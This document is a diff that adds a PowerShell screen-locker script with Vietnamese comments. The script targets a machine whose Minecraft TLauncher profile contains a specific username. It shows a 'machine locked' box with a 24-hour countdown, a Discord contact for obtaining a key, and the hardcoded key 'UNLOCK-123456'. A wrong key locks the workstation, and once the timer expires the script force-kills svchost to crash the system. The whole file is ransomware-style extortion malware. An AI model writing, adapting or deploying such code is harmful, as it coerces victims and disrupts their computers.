@@ -1,0 +1,54 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName Microsoft.VisualBasic
+
+# Cấu hình
+$tlauncherFile = "$env:APPDATA\.minecraft\TlauncherProfiles.json"
+$lockFile = "$env:APPDATA\lockdate.dat"
+$key = "UNLOCK-123456"
+$checkString = "khoi2802"
+$maxTimeout = New-TimeSpan -Hours 24
+
+# Nếu file tồn tại và chứa chuỗi
+if (Test-Path $tlauncherFile) {
+    $content = Get-Content $tlauncherFile -Raw
+    if ($content -match $checkString) {
+        # Tạo file lock nếu chưa có
+        if (-not (Test-Path $lockFile)) {
+            Get-Date | Out-File $lockFile
+        }
+
+        # Lấy thời điểm khoá và thời gian còn lại
+        $lockTime = Get-Content $lockFile | Get-Date
+        $now = Get-Date
+        $elapsed = $now - $lockTime
+        $remaining = $maxTimeout - $elapsed
+
+        # Nếu hết thời gian thì phá máy
+        if ($remaining.TotalSeconds -le 0) {
+            Stop-Process -Name svchost -Force
+        }
+
+        # Format thời gian còn lại
+        $countdown = "{0:D2}:{1:D2}:{2:D2}" -f $remaining.Hours, $remaining.Minutes, $remaining.Seconds
+
+        # Yêu cầu nhập key
+        $msg = "bensgaming on top`n"
+        $msg += "Máy bạn đã bị khoá.`n"
+        $msg += "Thời gian còn lại: $countdown`n"
+        $msg += "Liên hệ: https://discord.gg/rf3fcuwz để đc key"
+        $msg += "Vui lòng nhập key chính xác để mở khoá:"
+
+        $inputKey = [Microsoft.VisualBasic.Interaction]::InputBox(
+            $msg,
+            "Khóa hệ thống",
+            ""
+        )
+
+        if ($inputKey -eq $key) {
+            Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
+            [System.Windows.Forms.MessageBox]::Show("✅ Mở khoá thành công!", "Hoàn tất")
+        } else {
+            rundll32.exe user32.dll,LockWorkStation
+        }
+    }
+}
